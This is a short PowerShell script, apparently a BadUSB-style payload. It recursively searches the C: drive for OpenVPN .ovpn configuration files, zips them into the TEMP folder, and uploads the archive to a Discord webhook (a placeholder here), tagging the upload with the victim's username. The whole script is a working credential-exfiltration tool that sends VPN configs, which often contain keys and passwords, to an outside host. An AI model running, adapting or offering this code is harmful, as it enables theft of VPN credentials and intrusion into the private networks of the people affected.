function OVPN-Hog {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    $hookurl = 'DISCORD-WEBHOOK'

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))) {
        curl.exe -F "file1=@$file" $hookurl
    }
}

$Drive = "C:"

$Files = Get-ChildItem -Path $Drive -Filter "*.ovpn" -File -Recurse

if ($Files) {
    $types = @{
        "*.ovpn" = "OpenVPN"
    }

    foreach ($type in $types.Keys) {
        $filteredFiles = $Files | Where-Object { $_.Name -like $type }

        if ($filteredFiles) {
            $zipFile = Join-Path -Path $env:TEMP -ChildPath "$($types[$type]).zip"

            $filteredFiles | Compress-Archive -DestinationPath $zipFile

            OVPN-Hog -file $zipFile -text "Uploading $($types[$type]) files"
        }
    }
}
